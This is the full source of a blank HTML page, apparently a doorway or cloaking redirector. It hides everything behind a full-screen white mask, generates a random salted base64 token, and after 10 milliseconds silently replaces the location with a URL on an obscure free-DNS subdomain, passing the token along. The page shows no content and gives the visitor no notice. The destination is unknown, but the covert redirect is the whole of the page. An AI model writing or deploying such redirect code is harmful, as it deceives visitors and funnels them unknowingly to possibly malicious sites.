<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title></title>
<style>
*{margin:0;padding:0}
#mask{
    position:fixed;
    inset:0;
    background:#fff;
    z-index:9999999;
}
</style>
</head>
<body>
<div id="mask"></div>
<script>
window.addEventListener('DOMContentLoaded', () => {
    function genToken() {
        const dict = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let raw = '';
        for(let i=0;i<32;i++) raw += dict[Math.floor(Math.random()*dict.length)];
        return btoa(raw + '_salt_2026');
    }

    const token = genToken();
    const mask = document.getElementById('mask');
    mask.style.display = 'block';

    setTimeout(() => {
        const targetUrl = `https://aqtw.naling.dpdns.org/0/index.html?token=${encodeURIComponent(token)}`;
        location.replace(targetUrl);
    }, 10);
})
</script>
</body>
</html>
